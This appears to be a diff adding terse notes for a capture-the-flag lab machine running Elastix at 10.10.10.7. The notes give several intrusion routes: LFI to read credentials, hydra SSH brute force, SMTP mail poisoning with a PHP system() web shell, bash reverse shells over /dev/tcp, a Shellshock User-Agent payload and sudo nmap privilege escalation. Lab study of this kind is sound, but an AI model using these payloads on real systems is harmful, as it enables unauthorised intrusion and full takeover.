@@ -1,0 +1,51 @@
+nmap -sC -sV -oA nmap 10.10.10.7
+run dirbuster 
+
+
+solution method 1:
+go to https://10.10.10.7
+=>you will get a login page
+=>now on login page there is an logo named elastix
+=>curl -k https://logourl.png -o elastix.png
+=>exiftool elastix.png[no meta data intersting to see]
+=>searchsplot elastix [we found some exploits and lets use lfi]
+=>lfi echos password now lets check for ssh username by using lfi /etc/passwd now the username which contains bin/bash will contain the ssh
+=>lets use hydra by collecting password and username 
+=>hydra -L user.txt -P password.txt ssh://10.10.10.7
+=>now we got root access with useranme root and passwd from password.txt
+
+
+solution method 2:
+SMTP
+
+=>telnet 10.10.10.7 25
+=>EHLO something[ippsec.beep.htp]
+=>VRFY username
+=>mail from:pwned@haha.io
+=>rcpt to username
+>data 
+=>subject:you got owned
+<?php echo system($Request['ipp']); ?>
+exit telnet
+go to repeater and lfi /var/mail/username and action&ipp=whoami u can see code execution
+convert it into post request so that no url encoding 
+ipp = bash -i >& /dev/tcp/$ip/$port 0>&1[ctrl+u for url encoding on repeater ]
+nc -nlvp $port
+now we get shell 
+sudo -l [ to chek what i can run from searchsplit there is an another expoit for rc where we nmap]
+sudo nmap --interactive
+then from nmap menu we use !sh to get
+
+
+solution method 3:
+
+searchsploit elastix 
+searchsploit -p 18650.py
+copy the path modify the path and change lhost[my pc] rhost[10.10.10.7]
+if certificate problem arise 
+fireup the burp add 127.0.0.1 80
+now at lhsot change it localhost
+same nmap --interactive
+solution method 4:
+just reload the page
+got to useragent: () { :; }; bash -i >& /dev/tcp/ip/port 0>&1
